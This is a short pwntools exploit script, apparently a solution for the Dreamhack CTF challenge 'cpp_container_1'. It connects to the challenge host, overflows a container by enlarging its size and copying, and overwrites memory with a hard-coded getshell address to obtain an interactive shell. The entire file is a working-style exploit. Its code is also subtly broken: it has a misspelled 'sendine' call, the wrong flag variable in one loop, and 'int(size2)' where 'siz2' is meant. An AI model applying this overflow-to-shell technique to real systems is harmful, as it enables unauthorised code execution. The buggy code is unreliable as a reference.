from pwn import *
#p = process("./cpp_container_1")
p = remote("host1.dreamhack.games", 11887)
pause()
elf = ELF("./cpp_container_1")
libc = elf.libc
size1 = 3
size2 = 3
getshell = 0x0000000000401041
def makeContainer(data1, data2):
    global size1
    global size2
    p.sendlineafter("menu: ", "1")
    chk1 = False
    chk2 = False
    for i in range(size1):
        if(chk1 == False):
            p.sendline(data1)
            chk1 = True
        else:
            p.sendline(str(0))
            chk1 = False
    for i in range(size2):
        if(chk2 == False):
            p.sendline(data2)
            chk1 = True
        else:
            p.sendine(str(0))
            chk2 = True

def modifyContainer(siz1, siz2):
    global size1
    global size2
    p.sendlineafter("menu: ", "2")
    p.sendline(siz1)
    p.sendline(siz2)
    size1 = int(siz1)
    size2 = int(size2)

def copyContainer():
    p.sendlineafter("menu: ", "3")

if __name__ == "__main__":
    makeContainer("1111", "2222")
    modifyContainer("20", "3")
    makeContainer(str(getshell), str(getshell))
    copyContainer()
    p.interactive()
